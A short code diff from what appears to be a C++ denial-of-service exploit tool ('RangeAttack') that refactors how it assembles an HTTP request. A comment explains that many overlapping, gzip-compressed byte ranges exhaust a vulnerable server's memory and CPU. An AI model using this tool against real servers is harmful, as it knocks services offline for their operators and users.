@@ -53,13 +53,12 @@ std::string RangeAttack::build_request() {
   req.reserve(static_cast<std::size_t>(cfg_.range_limit) * 12 + 256);
   req += cfg_.effective_verb();
   req += ' ';
-  req += cfg_.target.path;
+  req += cfg_.request_target();
   req += " HTTP/1.1\r\n";
-  req += "Host: " + cfg_.target.host + "\r\n";
+  req += "Host: " + cfg_.target.host_in_url() + "\r\n";
   req += "User-Agent: " + cfg_.user_agent + "\r\n";
   req += "Accept: " + cfg_.accept + "\r\n";
-  if (!cfg_.cookie.empty()) req += "Cookie: " + cfg_.cookie + "\r\n";
-  if (!cfg_.extra_header.empty()) req += cfg_.extra_header + "\r\n";
+  req += cfg_.caller_headers();
   range_count_ = build_range_header(cfg_.range_start, cfg_.range_limit, &req);
   // gzip is part of the original exploit: compressing each overlapping range
   // separately is where a vulnerable server burns memory and CPU.
